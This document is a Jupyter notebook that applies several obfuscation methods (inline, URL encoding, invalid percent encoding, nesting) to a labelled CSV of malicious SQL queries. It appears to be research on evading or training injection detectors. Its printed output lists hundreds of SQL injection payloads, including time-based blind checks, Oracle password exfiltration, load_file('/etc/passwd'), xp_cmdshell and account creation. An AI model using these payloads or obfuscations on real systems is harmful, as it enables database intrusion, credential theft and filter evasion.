In [1]:
# read in malicious.csv
# import obfuscator
# apply obfuscator to malicious.csv

import pandas as pd
import numpy as np
import obfuscator
import os
import sys
import time

import warnings
warnings.filterwarnings('ignore')

In [2]:
# read in malicious.csv
malicious = pd.read_csv('malicious.csv', header=0)
print(malicious.head())

                                               Query  Label
0                  " or pg_sleep  (  __TIME__  )  --      1
1  create user name identified by pass123 tempora...      1
2   AND 1  =  utl_inaddr.get_host_address   (    ...      1
3   select * from users where id  =  '1' or @ @1 ...      1
4   select * from users where id  =  1 or 1#"  ( ...      1

In [3]:
# make all entries in the first column malicious.csv strings
malicious.iloc[:,0] = malicious.iloc[:,0].astype(str)

In [4]:
print(malicious.iloc[3, 0])

 select * from users where id  =  '1' or @ @1  =  1 union select 1,version  (    )   -- 1'

In [5]:
# apply inline obfuscation to malicious.csv
# save to inline_obfuscation.csv
inline_malicious = malicious.copy()
for i in range(0, len(malicious)):
    inline_malicious.iloc[i, 0] = obfuscator.ManipulateInput_Inline(malicious.iloc[i, 0])

inline_malicious.to_csv('inline_obfuscation.csv', index=False)

" or pg_sleep  (  __time__  )  --
create user name identified by pass123 temporary tablespace temp default tablespace users;
 and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  table_name  )   from   (  select distinct  (  table_name  )  , rownum as limit from sys.all_tables  )   where limit  =  5   )    )    and 'i'  =  'i
 select * from users where id  =  '1' or @ @1  =  1 union select 1,version  (    )   -- 1'
 select * from users where id  =  1 or 1#"  (   union select 1,version  (    )   -- 1
 select name from syscolumns where id   =     (  select id from sysobjects where name   =   tablename'  )  --
select * from users where id  =  1 +$+ or 1  =  1 -- 1
1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115,115,119,100   )    )     )  ,1,1,1;
 select * from users where id  =  '1' or ||/1  =  1 union select 1,version  (    )   -- 1'
 select * from users where id  =  '1' or \.<\ union select 1,@@version -- 1'
? or 1  =  1 --
 )   or   (  'a'  =  'a
admin' or 1  =  1#
 select * from users where id  =  1 or "  (  ]" or 1  =  1 -- 1
or 1  =  1 --
 and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  column_name  )   from   (  select distinct  (  column_name  )  , rownum as limit from all_tab_columns  )   where limit  =  5   )    )    and 'i'  =  'i
 select * from users where id  =  '1' %!<@ union select 1,version  (    )   -- 1'
 select * from users where id  =  1 or "&  (  " or 1  =  1 -- 1
 select * from users where id  =  1 or "?  (  " or 1  =  1 -- 1
distinct
select * from users where id  =  '1' *  (  \  )   or 1  =  1 -- 1'
1 and ascii  (  lower  (  substring   (    (   select top 1 name from sysobjects where xtype  =  'u'  )  , 1, 1   )    )     )   > 116
select * from users where id  =  1 or \.<\ or 1  =  1 -- 1
admin" or "1"  =  "1"--
 select * from users where id  =  1 or "%{" or 1  =  1 -- 1
insert
 select * from users where id  =  1 or 1#"?  =  1 or 1  =  1 -- 1
 select * from users where id  =  1 or "%?" or 1  =  1 -- 1
 and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  password  )   from   (  select distinct  (  password  )  , rownum as limit from sys.user$  )   where limit  =  8   )    )    and 'i'  =  'i
 select * from users where id  =  1 or "?#" or 1  =  1 -- 1
or 1  =  1 or ""  =
/**/or/**/1/**/  =  /**/1
 select * from users where id  =  1 or ".  (  " or 1  =  1 -- 1
 select * from users where id  =  '1' union select ||/1,version  (    )   -- 1'
 select * from users where id  =  '1' union select +\.,@@version -- 1'
or 1  =  1/*
%27 or 1  =  1
 select * from users where id  =  1 <@&@ union select 1,version  (    )   -- 1
 select * from users where id  =  '1' union select $*$,@@version -- 1'
1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115, ...
 select * from users where id  =  '1' or $ 1  =  1 union select 1,@@version -- 1'
select * from users where id  =  1 or \.<1 or 1  =  1 -- 1
 select * from users where id  =  '1' or \<\ union select 1,@@version -- 1'
 select * from users where id  =  1 union select 1||1,version  (    )   -- 1
 select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1
select * from users where id  =  '1' or \.<\ or 1  =  1 -- 1'
 select * from users where id  =  1 or "]{" or 1  =  1 -- 1
 select * from users where id  =  1 or ".@" or 1  =  1 -- 1
 select * from users where id  =  1 or "$[" or 1  =  1 -- 1
or 1 --'
 select * from users where id  =  1 or ",;" or 1  =  1 -- 1
admin" or 1  =  1#
 select * from users where id  =  1 +  (  1  )   union select null,banner from v$version where rownum  =  1 -- 1
\x27union select
print
 select * from users where id  =  '1' union select   (  \.  )  ,@@version -- 1'
or 1  =  1--
1 or pg_sleep  (  __time__  )  --
 select * from users where id  =  1 or ",#" or 1  =  1 -- 1
admin'  )   or   (  '1'  =  '1'/*
or 2 between 1 and 3
 select * from users where id  =  1 or "  )  ."  =  1 or 1  =  1 -- 1
 select * from users where id  =  1 or 1#". union select null,version  (    )   -- 1
admin' or '1'  =  '1
; if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --
 select * from users where id  =  1 union select 1,banner from v$version where rownum  =  1 -- 1
" or 0  =  0 --
 select * from users where id  =  1 union select @ $_,version  (    )   -- 1
select * from users where id  =  1 <@.$ or 1  =  1 -- 1
 select * from users where id  =  1 or "%." or 1  =  1 -- 1
 select * from users where id  =  1 + $+*$ union select null,@@version -- 1
 select * from users where id  =  1 or ",." or 1  =  1 -- 1
char%4039%41%2b%40select
 select * from users where id  =  1 or "1&" or 1  =  1 -- 1
admin'  )   or   (  '1'  =  '1
declare @s varchar   (  200  )   select @s   =   0x73656c6 ...
or 0  =  0 #"
 select * from users where id  =  1 or ".]" or 1  =  1 -- 1
  )   or   (  'x'  =  'x
 select * from users where id  =  1.<@$ union select 1,version  (    )   -- 1
$  (  sleep 50  )
 select * from users where id  =  1 *1 union select null,banner from v$version where rownum  =  1 -- 1
1 union all select 1,2,3,4,5,6,name from sysobjects where xtype   =   'u' --
 select * from users where id  =  1 or 1#". union select 'a',version  (    )   -- 1
 select * from users where id  =  1 or 1#"; union select null,version  (    )   -- 1
 select * from users where id  =  1 or 1#"? or 1  =  1 -- 1
"a"" or 1  =  1--"
 select * from users where id  =  1 *1 union select 1,banner from v$version where rownum  =  1 -- 1
 and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  column_name  )   from   (  select distinct  (  column_name  )  , rownum as limit from all_tab_columns  )   where limit  =  4   )    )    and 'i'  =  'i
 select * from users where id  =  '1' union select   (  \  )  ,@@version -- 1'
1 and user_name  (    )     =   'dbo'
; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --
 select * from users where id  =  1 or 1#"$ union select 1,version  (    )   -- 1
 select * from users where id  =  1 or 1#"{ union select null,version  (    )   -- 1
select * from users where id  =  '1' *$ . or 1  =  1 -- 1'
select * from users where id  =  1 +$+. or 1  =  1 -- 1
select * from users where id  =  1 or   (  \+  )    =  1 or 1  =  1 -- 1
 and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  username  )   from   (  select distinct  (  username  )  , rownum as limit from sys.all_users  )   where limit  =  6   )    )    and 'i'  =  'i
or 1  =  1 or ''  =  '
select * from users where id  =  1   or 1  =  1 -- 1
or 'text' > 't'
1234 " and 1  =  0 union all select "admin", "81dc9bdb52d04dc20036dbd8313ed055
 select * from users where id  =  1 or "%[" or 1  =  1 -- 1
 select * from users where id  =  1 or 1#";  =  1 union select 1,version  (    )   -- 1
admin' or '1'  =  '1'#
select * from users where id  =  1 +$ 1 or 1  =  1 -- 1
s
 and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  username  )   from   (  select distinct  (  username  )  , rownum as limit from sys.all_users  )   where limit  =  4   )    )    and 'i'  =  'i
 select * from information_schema.tables--
 select * from users where id  =  1 or "$&" or 1  =  1 -- 1
1   )    )    or pg_sleep  (  __time__  )  --
 select * from users where id  =  '1' union select !<@,version  (    )   -- 1'
declare @q nvarchar   (  200  )   select @q   =   0x770061 ...
 or 1  =  1 or ''  =  '
select * from users where id  =  1 %!<1 or 1  =  1 -- 1
declare @q nvarchar   (  200  )   select @q   =   0x770061006900740066006f0072002000640065006c00610079002000270030003a0030003a0031003000270000 exec  (  @q  )
 select * from users where id  =  1 or "]1" or 1  =  1 -- 1
 select * from users where id  =  1 or $+<1 union select 1,@@version -- 1
or 'unusual'   =   'unusual'
 or 1 in   (  select @@version  )  --
truncate
as
 or 3  =  3 --
 select * from users where id  =  1 ||1 union select 1,banner from v$version where rownum  =  1 -- 1
 select * from users where id  =  1 <@$$ union select 1,version  (    )   -- 1
admin"  )   or   (  "1"  =  "1
 select * from users where id  =  1 or 1#"@ union select 'a',version  (    )   -- 1
1  )   or benchmark  (  10000000,md5  (  1   )    )   #
 select * from users where id  =  1 union select .1_,version  (    )   -- 1
 and 1  =  utl_inaddr.get_host_address   (    (   select sys.database_name from dual   )    )    and 'i'  =  'i
 or 0  =  0 #"
select * from users where id  =  1 %$ 1 or 1  =  1 -- 1
select * from users where id  =  1 %!<@ or 1  =  1 -- 1
; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --
1  )   or sleep  (  __time__  )  #
 select * from users where id  =  1 or "1_" or 1  =  1 -- 1
 select * from users where id  =  1 <1## union select 1,version  (    )   -- 1
 select * from users where id  =  1 + $+*\ union select null,@@version -- 1
select * from users where id  =  1. <@ or 1  =  1 -- 1
 or true--
; execute immediate 'sel' || 'ect us' || 'er'
hi' or 'x'  =  'x';
select * from users where id  =  1 <@ or 1  =  1 -- 1
 select * from users where id  =  1 or ".," or 1  =  1 -- 1
admin' #
 select * from users where id  =  1 <@$_ union select 1,version  (    )   -- 1
 select * from users where id  =  1 or ",  (  " or 1  =  1 -- 1
 select * from users where id  =  1 or ",{" or 1  =  1 -- 1
 union select 1,load_file  (  '/etc/passwd'  )  ,1,1,1;
"  )  ;waitfor delay '0:0:__time__'--
 or 'unusual'   =   'unusual'
insert into mysql.user   (  user, host, password  )   values   (  'name', 'localhost', password  (  'pass123'   )    )
admin" or "1"  =  "1"/*
 select * from users where id  =  1 or "1  (  "  =  1 or 1  =  1 -- 1
 select * from users where id  =  1 or \<1 union select 1,@@version -- 1
like
or username like char  (  37  )  ;
 )    )    or pg_sleep  (  __time__  )  --
select * from users where id  =  1 or $+<\ or 1  =  1 -- 1
or 3  =  3
 select * from users where id  =  1 or "  (  ." or 1  =  1 -- 1
select * from users where id  =  1 or   (  $+  )    =  1 or 1  =  1 -- 1
exec sp
 select * from users where id  =  1 or \+<$ union select 1,@@version -- 1
select * from users where id  =  1 or \<$ or 1  =  1 -- 1
 select * from users where id  =  1.&&1 union select 1,version  (    )   -- 1
admin' or 1  =  1/*
a' waitfor delay '0:0:10'--
 select * from users where id  =  1 +  (  \  )   union select null,@@version -- 1
 select * from users where id  =  1 union select .1$_,version  (    )   -- 1
and 1 in   (  select var from temp  )  --
hi'  )   or   (  'a'  =  'a
 and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  column_name  )   from   (  select distinct  (  column_name  )  , rownum as limit from all_tab_columns  )   where limit  =  1   )    )    and 'i'  =  'i
admin" or 1  =  1
"  )   or true--
 select * from users where id  =  '1' or $ .  =  1 union select 1,@@version -- 1'
 select * from users where id  =  1 or "  (  {" or 1  =  1 -- 1
1  )   or pg_sleep  (  __time__  )  --
 select * from users where id  =  1 or "{." or 1  =  1 -- 1
"  )   or sleep  (  __time__  )    =  "
select * from users where id  =  1.<@. or 1  =  1 -- 1
admin"  )   or   (  "1"  =  "1"--
 select * from users where id  =  1<@.. union select 1,version  (    )   -- 1
; exec xp_regread
 select * from users where id  =  '1' + @ 1 union select 1,version  (    )   -- 1'
select * from users where id  =  1 + \+%1 or 1  =  1 -- 1
 select * from users where id  =  1 or ";1" or 1  =  1 -- 1
 select * from users where id  =  1 or "%&" or 1  =  1 -- 1
1 and 1  =  1
or 0  =  0 #
union select * from users where login   =   char ...
 select * from users where id  =  1 union select 1||@,version  (    )   -- 1
admin'  )   or '1'  =  '1'--
1;select *
 select * from users where id  =  1 or "{;" or 1  =  1 -- 1
x' and 1  =    (  select count  (  *  )   from tabname  )  ; --
 select * from users where id  =  '1' or ""<@ union select 1,version  (    )   -- 1'
 select * from users where id  =  1 or "?," or 1  =  1 -- 1
 select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'
1 or benchmark  (  10000000,md5  (  1   )    )   #
procedure
or ''  =  '
 and 1  =  utl_inaddr.get_host_address   (    (   select sys.login_user from dual   )    )    and 'i'  =  'i
 and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  username  )   from   (  select distinct  (  username  )  , rownum as limit from sys.all_users  )   where limit  =  2   )    )    and 'i'  =  'i
\'; desc users; --
 select * from users where id  =  1 or   (  \.  )    =  1 union select 1,@@version -- 1
select * from users where id  =  '1' or $ 1  =  1 or 1  =  1 -- 1'
" or ""^"
"-"
 select * from users where id  =  1 or \<   =  1 union select 1,@@version -- 1
 select * from users where id  =  1 union select 1<@$,version  (    )   -- 1
 select * from users where id  =  1 *\ union select null,@@version -- 1
 select * from users where id  =  '1' or !<@ union select 1,version  (    )   -- 1'
 select * from users where id  =  1 or ".%" or 1  =  1 -- 1
admin'/*
 select * from users where id  =  1 or "  (  #" or 1  =  1 -- 1
||utl_http.request
 and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  table_name  )   from   (  select distinct  (  table_name  )  , rownum as limit from sys.all_tables  )   where limit  =  1   )    )    and 'i'  =  'i
 select * from users where id  =  '1'<@.. union select 1,version  (    )   -- 1'
"   )    )    or benchmark  (  10000000,md5  (  1   )    )   #
 select * from users where id  =  1 <@.$ union select 1,version  (    )   -- 1
 select * from users where id  =  1 or $ .  =  1 union select 1,@@version -- 1
select * from users where id  =  '1' <@.$ or 1  =  1 -- 1'
1 uni/**/on select all from where
 select * from users where id  =  1 +$ . union select null,@@version -- 1
 select * from users where id  =  1 or 1#"? union select null,version  (    )   -- 1
admin'  )   or '1'  =  '1'#
||utl_http.request  (  'http://192.168.1.1/'  )  ||'
or '7659'  =  '7659
 select * from users where id  =  1 or "{@" or 1  =  1 -- 1
 select * from users where id  =  1 union select +!<1,version  (    )   -- 1
 and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  granted_role  )   from   (  select distinct  (  granted_role  )  , rownum as limit from dba_role_privs where grantee  =  sys.loginuser  )   where limit  =  6   )    )    and 'i'  =  'i
 select * from users where id  =  1 or "  (  @" or 1  =  1 -- 1
or true--
 select * from users where id  =  1 union select !<1,version  (    )   -- 1
 select * from users where id  =  '1' union select \#,@@version -- 1'
 select * from users where id  =  1 or 1#"{ union select 1,version  (    )   -- 1
" or true--
select * from users where id  =  1. or 1  =  1 -- 1
 select * from users where id  =  1 or @#",  =  1 union select 1,version  (    )   -- 1
 select * from users where id  =  1 or ";@" or 1  =  1 -- 1
â or 3  =  3 --
 and 1  =  utl_inaddr.get_host_address   (    (   select global_name from global_name   )    )    and 'i'  =  'i
 select * from users where id  =  1 +1 union select null,banner from v$version where rownum  =  1 -- 1
 select * from users where id  =  1 or ",,"  =  1 or 1  =  1 -- 1
 select * from users where id  =  1 + $+%1 union select null,@@version -- 1
 select * from users where id  =  1 or 1#"? union select version  (    )  ,version  (    )   -- 1
 select * from users where id  =  1 or "  )  1" or 1  =  1 -- 1
 or uid like '%
select * from users where id  =  '1' <@&1 or 1  =  1 -- 1'
 select * from users where id  =  '1' union select !<1,version  (    )   -- 1'
23 or 1  =  1; --
 select * from users where id  =  1 or \<\. union select 1,@@version -- 1
 select * from users where id  =  1 or "{  (  "  =  1 or 1  =  1 -- 1
 select * from users where id  =  1 or "%_" or 1  =  1 -- 1
select * from users where id  =  1 +   (  \.  )   or 1  =  1 -- 1
 select * from users where id  =  '1' union select \,@@version -- 1'
0 or 1  =  1
select * from users where id  =  1 &@ or 1  =  1 -- 1
admin"  )   or "1"  =  "1
select * from users where id  =  1 or \<   =  1 or 1  =  1 -- 1
 select * from users where id  =  1 or "??" or 1  =  1 -- 1
 and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  password  )   from   (  select distinct  (  password  )  , rownum as limit from sys.user$  )   where limit  =  5   )    )    and 'i'  =  'i
 and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  column_name  )   from   (  select distinct  (  column_name  )  , rownum as limit from all_tab_columns  )   where limit  =  7   )    )    and 'i'  =  'i
&apos; or
sqlvuln;
select * from users where id  =  1 + $+%$ or 1  =  1 -- 1
select * from users where id  =  '1' + $+%\ or 1  =  1 -- 1'
" or ""*"
hi or 1  =  1 --"
 select * from users where id  =  1. union select null,banner from v$version where rownum  =  1 -- 1
; exec master..xp_cmdshell 'ping 172.10.1.255'--
 select * from users where id  =  '1' or 1^  =  1 union select 1,banner from v$version where rownum  =  1 -- 1'
 select * from users where id  =  '1' union select "?"_,version  (    )   -- 1'
select * from information_schema.tables--
select * from users where id  =  1 or \<\. or 1  =  1 -- 1
   (  select top 1
ã½ or 1  =  1 --
a' --
 or 1  =  1 /*
 select * from users where id  =  1 or 1#", union select null,version  (    )   -- 1
 select * from users where id  =  '1' union select $ .,@@version -- 1'
--
exec sp_addlogin 'name' , 'password'
 select * from users where id  =  1   union select null,banner from v$version where rownum  =  1 -- 1
0x77616974666f722064656c61792027303a303a31302700 exec  (  @s  )
 select * from users where id  =  1 or ".  )  " or 1  =  1 -- 1
 select * from users where id  =  1 or @<@  =  1 union select 1,version  (    )   -- 1
group by userid having 1  =  1--
 select * from users where id  =  1 + \+%1 union select null,@@version -- 1
select * from users where id  =  1 *1 or 1  =  1 -- 1
 select * from users where id  =  1 or @#";  =  1 or 1  =  1 -- 1
‘ or 1  =  1 --
 select * from users where id  =  1 *\. union select null,@@version -- 1
select * from users where id  =  1 %  (  @  )   or 1  =  1 -- 1
or 'a'  =  'a
declare @s varchar  (  22  )   select @s   =
 select * from users where id  =  1 union select 1<@,version  (    )   -- 1
 select * from users where id  =  1 + \+*\ union select null,@@version -- 1
 select * from users where id  =  1 or 1#". union select version  (    )  ,version  (    )   -- 1
@variable
; exec master..xp_cmdshell
select * from users where id  =  1 +  (  1  )   or 1  =  1 -- 1
 select * from users where id  =  1 union select @ 1$,version  (    )   -- 1
 select * from users where id  =  1 union select @ 1a,version  (    )   -- 1
 select * from users where id  =  1 or  @$#  =  1 union select 1,version  (    )   -- 1
 select * from users where id  =  '1' or   (  \.  )    =  1 union select 1,@@version -- 1'
 and 1 in   (  select var from temp  )  --
 select * from users where id  =  '1' union select 1"!",banner from v$version where rownum  =  1 -- 1'
 select * from users where id  =  1 or "1]" or 1  =  1 -- 1
 select * from users where id  =  1 or "$?" or 1  =  1 -- 1
or x  =  x
or a  =  a
or '1'  =  '1
 select * from users where id  =  11<1# union select 1,version  (    )   -- 1
   )    )    or    (    (   'x'   )    )     =     (    (   'x
 select * from users where id  =  '1' or \.<1 union select 1,@@version -- 1'
 select * from users where id  =  '1' <@&1 union select 1,version  (    )   -- 1'
 and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  table_name  )   from   (  select distinct  (  table_name  )  , rownum as limit from sys.all_tables  )   where limit  =  4   )    )    and 'i'  =  'i
; if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --
select * from users where id  =  1 <@<@ or 1  =  1 -- 1
 select * from users where id  =  1 union select @<@$,version  (    )   -- 1

In [5]:
# apply url encoding obfuscation to malicious.csv
# save to url_encoding_obfuscation.csv
url_encoding_malicious = malicious.copy()
for i in range(0, len(malicious)):
    url_encoding_malicious.iloc[i, 0] = obfuscator.ManipulateInput_URL(malicious.iloc[i, 0])

url_encoding_malicious.to_csv('url_encoding_obfuscation.csv', index=False)

In [8]:
# Apply invalid percent encoding obfuscation to malicious.csv
# save to invalid_percent_encoding_obfuscation.csv
invalid_percent_encoding_malicious = malicious.copy()
for i in range(0, len(malicious)):
    invalid_percent_encoding_malicious.iloc[i, 0] = obfuscator.ManipulateInput_Percent(malicious.iloc[i, 0])

invalid_percent_encoding_malicious.to_csv('invalid_percent_encoding_obfuscation.csv', index=False)

In [9]:
# Apply nested command obfuscation to malicious.csv
# save to nested_command_obfuscation.csv
nested_command_malicious = malicious.copy()
for i in range(0, len(malicious)):
    nested_command_malicious.iloc[i, 0] = obfuscator.ManipulateInput_Nesting(malicious.iloc[i, 0])

nested_command_malicious.to_csv('nested_command_obfuscation.csv', index=False)